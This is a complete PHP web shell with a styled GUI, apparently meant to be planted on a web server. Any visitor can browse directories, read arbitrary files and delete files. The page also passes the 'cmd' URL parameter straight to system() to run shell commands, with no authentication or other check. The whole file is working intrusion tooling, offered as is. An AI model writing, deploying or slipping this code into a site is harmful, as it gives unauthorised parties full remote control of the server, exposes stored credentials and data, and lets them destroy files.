<?php
$path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$path || !is_dir($path)) {
    die("Invalid path.");
}

// Handle delete
if (isset($_GET['delete'])) {
    $delPath = realpath($path . DIRECTORY_SEPARATOR . $_GET['delete']);
    if (strpos($delPath, $path) === 0 && file_exists($delPath)) {
        if (is_dir($delPath)) {
            rmdir($delPath);
        } else {
            unlink($delPath);
        }
        header("Location: ?path=" . urlencode($path));
        exit;
    }
}

// Command exec
$output = '';
if (isset($_GET['cmd'])) {
    chdir($path);
    ob_start();
    system($_GET['cmd']);
    $output = ob_get_clean();
}

// CSS UI
echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>🌐 Web Shell GUI</title>
<style>
    body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; padding: 20px; }
    a { color: #61dafb; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .path { margin-bottom: 20px; }
    .box { background: #2c2f4a; padding: 10px; border-radius: 8px; margin-bottom: 10px; }
    ul { list-style: none; padding: 0; }
    li { margin: 5px 0; display: flex; justify-content: space-between; align-items: center; }
    .folder { color: #f1c40f; }
    .file { color: #95a5a6; }
    pre { background: #111; padding: 10px; border-radius: 5px; color: #0f0; overflow: auto; }
    input[type=text] { width: 60%; padding: 5px; background: #111; color: #0f0; border: 1px solid #555; }
    input[type=submit] { padding: 5px 10px; background: #333; color: #fff; border: none; cursor: pointer; }
    .del-btn { color: #e74c3c; margin-left: 10px; text-decoration: none; }
    .del-btn:hover { color: red; }
    h1 { color: #61dafb; }
</style>
</head>
<body>
<h1>🌐 PHP Web Shell GUI</h1>
HTML;

// Path navigation
echo "<div class='path box'><b>📁 Path:</b> ";
$parts = explode(DIRECTORY_SEPARATOR, $path);
$nav = "";
foreach ($parts as $p) {
    if ($p === "") continue;
    $nav .= DIRECTORY_SEPARATOR . $p;
    echo "<a href='?path=" . urlencode($nav) . "'>" . htmlspecialchars($p) . "</a> / ";
}
echo "</div>";

// File listing
$files = scandir($path);
echo "<div class='box'><ul>";
foreach ($files as $file) {
    if ($file === '.') continue;
    $full = $path . DIRECTORY_SEPARATOR . $file;
    $delLink = "<a class='del-btn' href='?path=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick=\"return confirm('Delete $file?');\">🗑️</a>";
    if (is_dir($full)) {
        echo "<li><span class='folder'>📁 <a href='?path=" . urlencode($full) . "'>" . htmlspecialchars($file) . "</a></span> $delLink</li>";
    } elseif (is_file($full)) {
        echo "<li><span class='file'>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "'>" . htmlspecialchars($file) . "</a></span> $delLink</li>";
    }
}
echo "</ul></div>";

// File view
if (isset($_GET['view'])) {
    $f = $path . DIRECTORY_SEPARATOR . $_GET['view'];
    if (is_file($f)) {
        echo "<div class='box'><b>📄 Viewing:</b> " . htmlspecialchars($_GET['view']) . "<pre>" . htmlspecialchars(file_get_contents($f)) . "</pre></div>";
    }
}

// Command input
echo <<<HTML
<div class="box">
<form method="GET">
    <input type="hidden" name="path" value="{$path}" />
    <input type="text" name="cmd" placeholder="Enter shell command..." />
    <input type="submit" value="Run" />
</form>
</div>
HTML;

// Command output
if ($output) {
    echo "<div class='box'><b>💻 Output:</b><pre>" . htmlspecialchars($output) . "</pre></div>";
}

echo "</body></html>";
?>
